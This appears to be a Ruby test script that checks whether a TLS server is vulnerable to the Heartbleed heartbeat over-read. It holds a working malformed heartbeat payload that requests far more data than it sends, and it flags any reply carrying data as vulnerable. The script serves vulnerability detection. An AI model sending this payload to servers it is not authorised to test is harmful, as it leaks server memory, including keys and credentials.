# encoding: BINARY
require 'socket'
require 'timeout'
require 'openssl'

module ContentType
  ALERT = "\x15"
  HEARTBEAT = "\x18"
end

def decode_hex(s)
  [s.split(/\s/).join("")].pack('H*')
end

CLIENT_HELLO = decode_hex <<-EOS
16 03 01 00 38 01 00 00 34 03
01 23 18 50 c0 c7 9d 32 9f 90
63 de 32 12 14 1f 8c eb f1 a4
45 2b fd cc 12 87 ca db 32 b5
96 86 16 00 00 06 00 0a 00 2f
00 35 01 00 00 05 00 0f 00 01
01
EOS

SERVER_HELLO = decode_hex <<-EOS
16 03 01 00 31 02 00 00 2d 03
01 23 18 50 c0 c7 9d 32 9f 90
63 de 32 12 14 1f 8c eb f1 a4
45 2b fd cc 12 87 ca db 32 b5
96 86 16 00 00 05 00 00 05 00
0f 00 01 01
EOS

SERVER_HELLO_DONE = "\x0e\x00\x00\x00"

PAYLOAD =  "\x18\x03\x01\x00\x03\x01\x40\x00"

TLSRecord = Struct.new(:type, :version, :value)

def read_record(sock)
  Timeout.timeout(3) do
    type = sock.read(1)
    version = sock.read(2)
    length = sock.read(2).unpack('n')[0]
    value = length > 0 ? sock.read(length) : nil
    TLSRecord.new(type, version, value)
  end
end

def evaluate_heartbeat(sock)
  heartbeat = read_record(sock)

  case heartbeat.type
  when ContentType::HEARTBEAT
    raise "Vulnerable!" if heartbeat.value
    puts "Received a heartbeat response, but it contained no data. This is OK."
  when ContentType::ALERT
    puts "Received an alert instead of a heartbeat response. This is OK."
  else
    raise "Received an unexpected ContentType: #{heartbeat.type.inspect}"
  end   
rescue Timeout::Error
  puts "Received a timeout when waiting for heartbeat response. This is OK."
end
